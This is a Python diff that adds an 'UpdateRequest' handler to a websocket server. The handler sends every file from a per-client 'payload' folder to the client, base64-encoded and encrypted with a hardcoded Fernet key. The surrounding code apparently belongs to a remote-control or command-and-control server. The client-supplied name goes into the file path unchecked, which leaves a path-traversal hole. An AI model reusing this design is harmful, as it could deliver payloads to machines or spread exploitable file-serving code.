@@ -3,6 +3,7 @@ import websockets
 import json
 import os
 from cryptography.fernet import Fernet
+import base64
 
 SHARED_KEY = b'UM_pZBDsFnObCNvGijuUAiLexwfgPOv3ATMHvxjAa-Q=' # Placeholder key
 fernet = Fernet(SHARED_KEY)
@@ -34,7 +35,20 @@ async def handler(websocket):
                 await websocket.send(fernet.encrypt(result.encode()))
                 
             elif "UpdateRequest" in data:
-                pass
+                client_name = data["UpdateRequest"]["Client"]
+                client_payload_path = os.path.join("payload", client_name)
+                if os.path.isdir(client_payload_path):
+                    for file_name in os.listdir(client_payload_path):
+                        file_path = os.path.join(client_payload_path, file_name)
+                        if os.path.isfile(file_path):
+                            with open(file_path, "rb") as f:
+                                encoded_content = base64.b64encode(f.read()).decode("utf-8")
+                            payload = {
+                                "FileName": file_name,
+                                "FileContent": encoded_content
+                            }
+                            await websocket.send(fernet.encrypt(json.dumps(payload).encode()))
+                await websocket.send(fernet.encrypt(json.dumps({"Done": True}).encode()))
 
         except Exception:
             pass
